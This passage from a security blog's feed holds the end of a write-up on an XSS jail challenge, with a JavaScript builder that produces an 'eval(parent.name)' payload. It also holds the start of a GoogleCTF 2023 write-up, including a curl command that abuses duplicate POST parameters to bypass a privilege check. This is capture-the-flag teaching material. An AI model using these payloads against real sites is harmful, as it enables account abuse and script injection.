class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token function">findTarget</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> initPath<span class="token punctuation">)</span>  <span class="token comment">// return the shortest one</span>  <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token punctuation">.</span>length <span class="token operator">-</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">function</span> <span class="token function">findTarget</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>    visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">const</span> list <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> item <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span>      <span class="token keyword">const</span> newPath <span class="token operator">=</span> path <span class="token operator">?</span> path <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> key <span class="token operator">:</span> key      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">matchFn</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> item <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">findTarget</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> newPath<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token parameter">init<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> init<span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">bfs</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> <span class="token punctuation">[</span>path<span class="token punctuation">,</span> current<span class="token punctuation">]</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> value <span class="token operator">=</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">?.</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> newPath <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Math.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>path<span class="token punctuation">]</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> newPath          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">return</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>newPath<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token parameter">arrName<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> currentIndex <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">let</span> codeResult <span class="token operator">=</span> <span class="token string">''</span>  <span class="token comment">// @credit: @y0d3n</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.imul'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.seeds.splice'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">findMathName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> char</span><span class="token punctuation">)</span> <span class="token operator">=></span>      <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math.abs.name.constructor'</span><span class="token punctuation">)</span>     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> char <span class="token keyword">of</span> content<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>    <span class="token comment">// if we can find it in the Math for the current index, use it</span>    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> mapping <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token punctuation">[</span><span class="token string">'Math.LN2.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 0</span>      <span class="token punctuation">[</span><span class="token string">'Math.LOG2E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 1</span>      <span class="token punctuation">[</span><span class="token string">'Math.E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 2</span>      <span class="token punctuation">[</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 3</span>    <span class="token punctuation">]</span>    <span class="token comment">// try to find Math.fn[i] == char</span>    <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>mapping<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> char<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>char <span class="token operator">===</span> <span class="token string">'v'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> <span class="token string">'Math.LN2.valueOf'</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span>mapping<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        currentIndex<span class="token operator">++</span>        found <span class="token operator">=</span> <span class="token boolean">true</span>        <span class="token keyword">break</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @credit: @Astrid</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>char <span class="token operator">===</span> <span class="token string">'('</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.isPrototypeOf.name.length.valueOf'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.log2'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.exp'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>char <span class="token operator">===</span> <span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.exp'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.acosh'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.exp'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> mathResult <span class="token operator">=</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      mathResult<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// remember to reverse cause the order</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> row <span class="token keyword">of</span> mathResult<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// add eval structure</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.random.name.valueOf'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.join</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor.prototype.call.call'</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> ans<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ans<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    codeResult <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>codeResult<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)</span><span class="token template-punctuation string">`</span></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Math<span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">// @credit: @DrBrix</span><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token string">'Math.seeds'</span><span class="token punctuation">,</span> <span class="token string">'eval(parent.name)'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'length:'</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Perhaps there might be something even shorter, but I’m too lazy to search for it.</p><h2><span id="conclusion">Conclusion</span></h2><p>The above is the solution to the challenge and the thought process behind it.</p><p>Originally, the ideal situation was to find a usable array directly from Math, without needing <code>Math.seeds</code>. However, upon trying, it seems I couldn’t find such a solution.</p><p>I’ve also learned a lot from other hackers’ solutions, like clearing the array or achieving even shorter payloads, things I didn’t anticipate when designing the challenge. Kudos to all the hackers!</p><p>I hope that everyone has learned something from this challenge and had a great time participating.</p><p>Thank you all for your participation, and I look forward to crossing paths again in future challenges!</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;In the monthly challenges at Intigriti, I presented an XSS challenge that I named “Math Jail.” You can find the challenge at the following link: &lt;a href=&quot;https://challenge-0823.intigriti.io/&quot;&gt;https://challenge-0823.intigriti.io/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Now that the challenge has concluded, I’d like to take this opportunity to discuss the thought process behind creating the challenge and share some of the solutions that were developed.&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>GoogleCTF + zer0ptsCTF + ImaginaryCTF 2023 Writeup</title>
    <link href="https://blog.huli.tw/2023/07/28/en/google-zer0pts-imaginary-ctf-2023-writeup/"/>
    <id>https://blog.huli.tw/2023/07/28/en/google-zer0pts-imaginary-ctf-2023-writeup/</id>
    <published>2023-07-28T06:10:44.000Z</published>
    <updated>2023-07-29T12:30:21.520Z</updated>
    
    <content type="html"><![CDATA[<p>A while ago, I was busy traveling and didn’t have much time for CTFs. Even if I did participate, I was too lazy to write a writeup, so my last writeup was back in March. I felt it was a shame to break the streak, so I quickly wrote another one to make up for it.</p><p>Regarding the three CTFs mentioned in the title, I only participated in GoogleCTF 2023. For the other two events, I only briefly looked at the challenges, so this post will only serve as a note on the challenges and their solutions.</p><p>Keyword list:</p><ol><li>Inconsistent order of POST data parsing between Flask and PHP</li><li>iframe CSP blocking certain script loads</li><li>CSRF bypass using HEAD method</li><li>Accessing parent origin using <code>location.ancestorOrigins</code></li><li>Changing iframe location doesn’t affect the src</li><li>Angular CSP bypass gadget in recaptcha URL</li><li>Restoring input using <code>document.execCommand(&#39;undo&#39;);</code></li><li>X-HTTP-Method-Override</li><li>Differences between HTML and XHTML parsers</li></ol><span id="more"></span><h2><span id="googlectf-2023">GoogleCTF 2023</span></h2><p>Here is the complete official challenge content and solution: <a href="https://github.com/google/google-ctf/tree/master/2023">https://github.com/google/google-ctf/tree/master/2023</a></p><h3><span id="under-construction-466-solves">UNDER-CONSTRUCTION (466 solves)</span></h3><p>The core code for this challenge is as follows:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@authorized<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/signup'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">signup_post</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    raw_request <span class="token operator">=</span> request<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>    tier <span class="token operator">=</span> models<span class="token punctuation">.</span>Tier<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'tier'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>tier <span class="token operator">==</span> models<span class="token punctuation">.</span>Tier<span class="token punctuation">.</span>GOLD<span class="token punctuation">)</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'GOLD tier only allowed for the CEO'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.signup'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">15</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'Username length must be between 4 and 15'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.signup'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    user <span class="token operator">=</span> models<span class="token punctuation">.</span>User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user<span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'Username address already exists'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.signup'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    new_user <span class="token operator">=</span> models<span class="token punctuation">.</span>User<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">,</span>         password<span class="token operator">=</span>generate_password_hash<span class="token punctuation">(</span>password<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'sha256'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tier<span class="token operator">=</span>tier<span class="token punctuation">.</span>name<span class="token punctuation">)</span>    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>new_user<span class="token punctuation">)</span>    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>PHP_HOST<span class="token punctuation">&#125;</span></span><span class="token string">:1337/account_migrator.php"</span></span><span class="token punctuation">,</span>         headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"token"</span><span class="token punctuation">:</span> TOKEN<span class="token punctuation">,</span> <span class="token string">"content-type"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content-type"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>raw_request<span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>There is a registration feature that checks the parameters in the data. After the check, the request is forwarded to PHP. Our goal is to create a user with a tier of GOLD.</p><p>The solution exploits the inconsistency in POST data parsing between PHP and Flask. If we pass <code>a=1&amp;a=2</code>, Flask will retrieve <code>1</code> (the first one) for the parameter <code>a</code>, while PHP will retrieve <code>2</code> (the last one).</p><p>Therefore, by leveraging this inconsistency, we can create a legitimate user in Flask with the tier set to GOLD when forwarding the request to PHP:</p><pre class="line-numbers language-none"><code class="language-none">curl -X POST http:&#x2F;&#x2F;&lt;flask-challenge&gt;&#x2F;signup -d &quot;username&#x3D;username&amp;password&#x3D;password&amp;tier&#x3D;blue&amp;tier&#x3D;gold&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3><span id="biohazard-14-solves">BIOHAZARD (14 solves)</span></h3><p>This challenge allows you to create a note, and the goal is to perform an XSS attack.</p><p>During the rendering of the note, there is a prototype pollution vulnerability. The rendering process first sanitizes the input:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.dom'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.dom.safe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token 